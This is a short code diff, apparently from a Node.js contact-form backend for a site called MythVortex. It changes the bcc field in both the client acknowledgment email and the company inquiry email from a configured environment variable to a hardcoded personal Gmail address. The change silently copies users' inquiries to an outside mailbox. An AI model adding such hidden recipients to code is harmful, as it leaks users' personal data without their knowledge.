@@ -37,7 +37,7 @@ Where Myths Meet The Innovation`
         var clientMailOptions = {
             from: process.env.NODEMAILER_EMAIL,
             to: email,
-            bcc: process.env.NODEMAILER_EMAIL,
+            bcc: 'taryan3087@gmail.com',
             subject: "MythVortex: Inquiry Acknowledged",
             text: clientCopy,
         };
@@ -58,7 +58,7 @@ MythVortex`
         var companyMailoptions = {
             from: process.env.NODEMAILER_EMAIL,
             to: 'contact@mythvortex.com',
-            bcc: process.env.NODEMAILER_EMAIL,
+            bcc: 'taryan3087@gmail.com',
             subject: subject,
             text: companyMessage,
         };
